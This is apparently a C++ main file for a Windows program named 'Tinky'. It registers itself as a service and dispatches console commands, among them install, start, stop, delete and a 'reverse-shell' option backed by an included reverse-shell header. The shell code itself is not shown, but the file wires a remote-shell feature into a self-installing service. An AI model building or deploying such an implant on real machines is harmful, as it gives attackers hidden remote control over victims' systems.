#include "tinky.hpp"
#include "utils.hpp"
#include "reverseShell.h"

using namespace std;

static void cleanExit(tinky_t *tinky) {
	if (tinky->scmHandler) {
		if (!CloseServiceHandle(tinky->scmHandler))
			cerr << "Failed to close the Service Control Manager Handle\n";
	}

	if (tinky->serviceHandler) {
		if (!CloseServiceHandle(tinky->serviceHandler))
			cerr << "Failed to close the Service Control Manager Handle\n";
	}
}

tinky_t tinky = {};
processes_t processes = {};
HANDLE journalHandle = NULL;

int __cdecl main(int argc, char **argv) {

	if (argc == 1) { /* Service Console Manager Call */

		journalHandle = RegisterEventSourceA(NULL, "Tinky"); // JOURNAL
		return (startedBySCM());


	} else if (argc == 2) { /* Console Call */

		char *args[] = { "install", "start", "stop", "delete", "reverse-shell" };
		int (*funcPtr[]) (void) = { &install, &start, &stop, &uninstall, &initShell };
		
		bool isJobDone = false;

		for (int i = 0; i < NFUNC; i++) {
			if (!strcmp(argv[1], args[i])) {
				funcPtr[i]();
				isJobDone = true;
			}
		}
		cleanExit(&tinky);
		return (isJobDone == false ? printErr(EINARG, argv[1]) : EXIT_SUCCESS);
	} else {
		printUsage();
	}
	return (EXIT_FAILURE);
}